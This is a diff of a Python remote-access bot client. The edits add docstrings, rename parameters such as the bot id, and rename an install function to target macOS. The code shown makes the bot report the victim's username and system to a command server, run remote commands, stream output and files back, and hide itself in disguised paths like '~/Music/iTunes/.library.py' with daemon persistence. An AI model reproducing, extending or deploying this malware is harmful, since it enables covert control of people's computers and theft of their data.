@@ -49,9 +49,11 @@ RUNNING = True
 normstdout = sys.stdout
 normstderr = sys.stderr
 
+proc = None
+
+
 # Supporting classes
 class FormatSocket:
-
     SIZE_BYTES = 4
     RECV_SIZE = 2**13
 
@@ -112,13 +114,24 @@ class FormatSocket:
     def close(self):
         self.sock.close()
 
+
 class AppendDataLock:
     FILLTO = 2**14
+
     def __init__(self, datinit=bytes):
+        '''
+        Creates a new buffer lock, datinit must be a list-like data type
+        :param datinit:
+        '''
         self.dat = datinit()
         self.lock = threading.Lock()
         self.condition = threading.Condition(self.lock)
+
     def append(self,dat):
+        '''
+        Adds data to the buffer
+        :param dat: data of type :datinit: from constructor
+        '''
         with self.lock:
             if type(self.dat)!=type(dat):
                 if type(self.dat)==bytes and type(dat)==str:
@@ -128,7 +141,13 @@ class AppendDataLock:
             while len(self.dat)>=AppendDataLock.FILLTO:
                 self.condition.wait()
             self.dat += dat
+
     def getdat(self,upto):
+        '''
+        Gets data stored up to :upto: items (characters/bytes/entries) and clears
+        :param upto: number of items
+        :return: up to :upto: items
+        '''
         with self.lock:
             if upto > 0:
                 temp = self.dat[:upto]
@@ -136,6 +155,7 @@ class AppendDataLock:
                 self.condition.notify()
                 return temp
             return self.dat[:0]
+
     def empty(self):
         with self.lock:
             return len(self.dat) == 0
@@ -144,6 +164,11 @@ class ByteLockBundler:
     PACKET_MAX_DAT = 2**13
 
     def __init__(self, fsock):
+        '''
+        Creates a new bytelock bundler based on :fsock: as a connection
+        to a host
+        :param fsock: FormatSocket object
+        '''
         self.stdoutbytes = AppendDataLock(bytes)
         self.stderrbytes = AppendDataLock(bytes)
         self.printstrs = AppendDataLock(str)
@@ -156,18 +181,39 @@ class ByteLockBundler:
         self.slock = threading.Lock()
 
     def writeStdout(self, wbytes):
+        '''
+        Write to stdout on the server
+        :param wbytes: bytes
+        '''
         self.stdoutbytes.append(wbytes)
 
     def writeStderr(self, wbytes):
+        '''
+        Write to stderr on the server
+        :param wbytes: bytes
+        '''
         self.stderrbytes.append(wbytes)
 
     def writePrintstr(self, wstr):
+        '''
+        Write to stdout on the server
+        :param wstr: str
+        '''
         self.printstrs.append(wstr)
 
     def writeErrstr(self, wstr):
+        '''
+        Write to stderr on the server
+        :param wstr: str
+        '''
         self.errstrs.append(wstr)
 
     def writeFileup(self, filename, wbytes):
+        '''
+        Upload bytes to the server
+        :param filename: filename being written
+        :param wbytes: chunk of bytes for file
+        '''
         with self.flock:
             if filename not in self.filebytes:
                 self.filebytes[filename] = AppendDataLock()
@@ -176,7 +222,7 @@ class ByteLockBundler:
 
     def writeSpecial(self, name, wbytes):
         '''
-        Special commands must be sent in entirety
+        Special commands that must be sent in entirety
         :param name: name of command
         :param wbytes: bytes of command
         '''
@@ -184,11 +230,20 @@ class ByteLockBundler:
             self.specialbytes[name] = wbytes.decode('UTF-8')
 
     def closeFile(self, filename):
+        '''
+        Indicate to the server a file should be closed
+        :param filename: name of file to close
+        '''
         with self.flock:
             if filename not in self.fileclose:
                 self.fileclose.append(filename)
 
     def getAndClear(self, bytesize=4096):
+        '''
+        Get items from data buffers up to bytesize total and clear
+        :param bytesize: total number of bytes (approx x2) to be written
+        :return: dataremaining (bool), datawritten (bool), writedict (dict)
+        '''
         specialremaining = False
         specs = {}
         with self.slock:
@@ -248,14 +303,23 @@ class ByteLockBundler:
         return dataremaining, datawritten, writedict
 
     def writeBundle(self):
+        '''
+        Takes data from buffers and sends to server
+        :return: boolean if data is remaining in the buffers
+        '''
         dataremaining, datawritten, writedict = self.getAndClear()
         if datawritten:
             json_str = json.dumps(writedict)
             self.fsock.send(json_str)
         return dataremaining
 
+
 class PayloadLib:
     def __init__(self, bytelock):
+        '''
+        Create payload lib
+        :param bytelock: bytelock to use for forwarding files
+        '''
         self.bytelock = bytelock
 
     def upload(self, filename,blocking=False):
@@ -281,23 +345,34 @@ class PayloadLib:
 
 
 class WriterWrapper:
+    '''
+    A special wrapper function to use as stdout/stderr
+    '''
     def __init__(self, writefunc):
         self.func = writefunc
+
     def write(self, wstr):
         self.func(wstr)
 
 
 # Scripts
-def main(hostaddr=HOST, hostport=PORT, bid=None):
+def main(host=HOST, port=PORT, botid=None):
+    '''
+    Main loop, checks internet and attempts to connect to server,
+    on error continues to check every minute
+    :param host: server addr
+    :param port: server port
+    :param botid: id if set, else None
+    '''
     while RUNNING:
         if hasInternetConnection():
             try:
                 # Get and send info
                 user, arch = getInfo()
-                infodict = dict(user=user, arch=arch, version=__version__, bid=bid)
+                infodict = dict(user=user, arch=arch, version=__version__, bid=botid)
                 json_str = json.dumps(infodict)
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((hostaddr, hostport))
+                s.connect((host, port))
                 sslbyte = s.recv(1)
                 if sslbyte != b'\x00':
                     s = ssl.wrap_socket(s)
@@ -308,11 +383,15 @@ def main(hostaddr=HOST, hostport=PORT, bid=None):
                 sys.stderr.write("[!] "+str(e))
         if RUNNING:
             # Try again in a minute
-            time.sleep(10)
+            time.sleep(60)
 
 
-proc = None
 def serve(sock):
+    '''
+    Check the socket, setup various processes, run commands as requested,
+    exits on autoupdate or host transfer.
+    :param sock: socket to check
+    '''
     global proc
 
     bytelock = ByteLockBundler(sock)
@@ -333,6 +412,7 @@ def serve(sock):
 
     # Get commands from server, parse and send appropriate to proc
     def pollProcStdout():
+        '''Check process output'''
         while RUNNING:
             with proclock:
                 reader = proc.stdout
@@ -344,6 +424,7 @@ def serve(sock):
                 bytelock.writeStdout(out)
 
     def pollProcStderr():
+        '''Check process output'''
         while RUNNING:
             with proclock:
                 reader = proc.stderr
@@ -355,6 +436,7 @@ def serve(sock):
                 bytelock.writeStderr(out)
 
     def pollSock():
+        '''Check socket output and respond to queries'''
         global RUNNING
         global proc
         fileobjs = {}
@@ -457,6 +539,7 @@ def serve(sock):
                 bytelock.fsock.close()
 
     def writeBundles():
+        '''Write output to json and send home'''
         remains = True
         while RUNNING:
             if not remains:
@@ -481,6 +564,7 @@ def serve(sock):
 
 
 def getInfo():
+    '''Get information about system'''
     user = getpass.getuser()
     if platform.system() == 'Darwin':
         arch = 'OSX ' + platform.mac_ver()[0] + ' ' + platform.mac_ver()[2]
@@ -490,6 +574,7 @@ def getInfo():
 
 
 def hasInternetConnection():
+    '''Check google for internet connection'''
     try:
         socket.getaddrinfo("google.com", 80)
         return True
@@ -532,7 +617,12 @@ SCRIPT_LOCS = ['~/Music/iTunes/.library.py', '~/.dropbox/.index.py']
 INSTALL_FLAG = '-install'
 
 
-def install(hostaddr,hostport):
+def install_osx(host, port):
+    '''
+    Install onto target osx computer
+    :param host: server host addr
+    :param port: server port
+    '''
     # Find python
     proc = subprocess.Popen(["which", "python"], stdout=subprocess.PIPE)
     (out, err) = proc.communicate()
@@ -554,8 +644,8 @@ def install(hostaddr,hostport):
         return False
     # Install host information
     with open(os.path.join(script_path,HOSTINFOFILE),"w") as f:
-        f.write(hostaddr + "\n")
-        f.write(str(hostport))
+        f.write(host + "\n")
+        f.write(str(port))
 
     # Now we have hidden the script
     daemon_loc = None
@@ -580,7 +670,7 @@ if __name__ == "__main__":
         if len(sys.argv) > install_index+2:
             hostaddr = sys.argv[install_index+1]
             hostport = sys.argv[install_index+2]
-        install(hostaddr,hostport)
+        install_osx(hostaddr,hostport)
     else:
         hostaddr = HOST
         hostport = PORT
